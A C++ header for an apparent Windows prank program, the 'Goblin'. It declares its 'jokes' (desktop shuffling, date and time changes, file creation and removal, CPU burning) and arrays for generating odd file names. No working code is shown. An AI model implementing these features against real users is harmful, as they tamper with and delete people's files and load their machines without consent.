#pragma once

#define WIN32_LEAN_AND_MEAN
#define DEBUG_MODE

#include <ctime>
#include <iostream>
#include <windows.h>

// Filenames formats
enum class Filename_fmt
{
	eastern,
	only_num,
	name_num,
};

// The list of jokes that the Goblin can make to users
enum class Jokes:int 
{
	dont,
	cli_with_msg,
	desktop_shuffle,
	desktop_unshuffle,
	time_date_mod,
	files_creation,
	files_removal,
	cpu_burn,
};

// Data structure to pass data to jokes functions
typedef struct joke_data {
	char* str_1;
	char* str_2;
	tm* date_1;
	tm* date_2;
	bool bool_1;
	bool bool_2;
	int int_1;
	int int_2;
	Filename_fmt fn_fmt;
} joke_data;

static WCHAR NUMS[] = L"0123456789";

// Used to create filenames
static std::wstring NAMES[20] = {
	L"Wozniak",
	L"Babbage",
	L"Lovelace",
	L"Jobs",
	L"Rusinovich",
	L"Gates",
	L"Neumann",
	L"Torvalds",
	L"Turing",
	L"Hellman",
	L"Diffie",
	L"Berners_Lee",
	L"Stallman",
	L"Thompson",
	L"Ritchie",
	L"Stroustrup",
	L"Allen",
	L"Hamilton",
	L"Boole",
	L"Jobs",
};

// Used to create filenames with eastern letters
static std::wstring EASTERN_LETTERS[20] = {
	L"\u0434",
	L"\u0436",
	L"\u0444",
	L"\u0446",
	L"\u0448",
	L"\u0449",
	L"\u045E",
	L"\u045F",
	L"\u0460",
	L"\u0461",
	L"\u0462",
	L"\u0463",
	L"\u0464",
	L"\u0465",
	L"\u0466",
	L"\u0467",
	L"\u0468",
	L"\u0469",
	L"\u046A",
	L"\u046B"
};
